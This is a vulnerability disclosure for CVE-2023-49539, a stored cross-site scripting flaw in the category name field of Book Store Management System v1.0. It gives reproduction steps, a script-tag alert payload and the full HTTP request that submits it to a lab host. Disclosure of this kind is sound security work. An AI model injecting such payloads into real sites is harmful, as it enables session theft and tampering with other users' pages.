# CVE-2023-49539
# Book Store Management System v1.0 -  Cross-site scripting (XSS) vulnerability in "index.php/category" - vulnerable field: "Category Name"


**Description**: Book Store Management System v1.0 was discovered to contain a cross-site scripting (XSS) vulnerability in "/bsms_ci/index.php/category". This vulnerability allows attackers to execute arbitrary web scripts or HTML via a crafted payload injected into the "category Name" field.  

**Vulnerable Product Version**: Book Store Management System v1.0  
**CVE Author**: Geraldo Alcântara  
**Date**: 29/11/2023  
**Confirmed on**: 15/12/2023  
**CVE**: CVE-2023-49539  
**Tested on**: Windows  
### Steps to reproduce:  
The vulnerability exists within the "/bsms_ci/index.php/category/" page. Specifically, when creating/editing a category, the 'Category Name' field has been identified as vulnerable. Attackers can exploit this vulnerability by injecting a cross-site scripting (XSS) payload into the "Category Name" field during the category creation/edition process.    
### Payload:
```
<\td><script>alert(document.domain)</script>
```
### Request:
```
POST /bsms_ci/index.php/category/category_update HTTP/1.1
Host: 192.168.68.148
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 113
Origin: http://192.168.68.148
Connection: close
Referer: http://192.168.68.148/bsms_ci/index.php/category
Cookie: csrftoken=1hWW6JE5vLFhJv2y8LwgL3WNPbPJ3J2WAX9F2U0Fd5H5t6DSztkJWD4nWFrbF8ko; sessionid=xrn1sshbol1vipddxsijmgkdp2q4qdgq; ci_session=72ruij3r4688s92v273ncnqjm150uvu8
Upgrade-Insecure-Requests: 1

category_code_lama=12&category_code=12&category_name=%3c%5ctd%3e%3cscript%3ealert(document.domain)%3c%2fscript%3e&edit=Save
```
Discoverer(s)/Credits:  
Geraldo Alcântara  
